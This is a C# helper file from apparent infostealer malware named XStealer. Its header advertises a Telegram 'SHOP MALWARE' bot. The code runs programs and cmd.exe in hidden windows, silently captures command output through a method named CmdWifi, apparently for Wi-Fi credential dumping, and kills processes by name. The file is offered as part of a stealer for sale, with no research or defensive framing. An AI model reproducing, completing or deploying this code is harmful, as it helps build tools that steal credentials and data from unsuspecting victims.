// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Helpers
{
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Linq;

    public static class ProcessEx
    {
        public static bool Run(string command)
        {
            if (!string.IsNullOrWhiteSpace(command))
            {
                try
                {
                    var startInfo = new ProcessStartInfo
                    {
                        FileName = command,
                        CreateNoWindow = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    using var info = Process.Start(startInfo);
                    info.Refresh();
                    return true;
                }
                catch (Exception) { return false; }
            }
            return true;
        }

        public static bool RunCmd(string args)
        {
            if (!string.IsNullOrWhiteSpace(args))
            {
                try
                {
                    var startInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = args,
                        CreateNoWindow = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    using var info = Process.Start(startInfo);
                    info.Refresh();
                    return true;
                }
                catch (Exception) { return false; }
            }
            return true;
        }

        public static string CmdWifi(string cmd, bool wait = true)
        {
            string output = "";
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    FileName = "cmd.exe",
                    Arguments = cmd,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                };
                using var info = Process.Start(startInfo);
                output = info.StandardOutput.ReadToEnd();
                if (wait) info.WaitForExit();
            }
            catch { }
            return output;
        }

        public static void Closing(string name)
        {
            try
            {
                Process[] allprocess = Process.GetProcesses();
                foreach (Process process in allprocess.Where(process => process.ProcessName.Contains(name)).Select(process => process))
                {
                    try
                    {
                        process?.CloseMainWindow();
                        if (!process.HasExited)
                        {
                            try
                            {
                                process.Kill();
                            }
                            catch (Win32Exception) { break; }
                        }
                    }
                    catch (Exception) { continue; }
                }
            }
            catch { }
        }
    }
}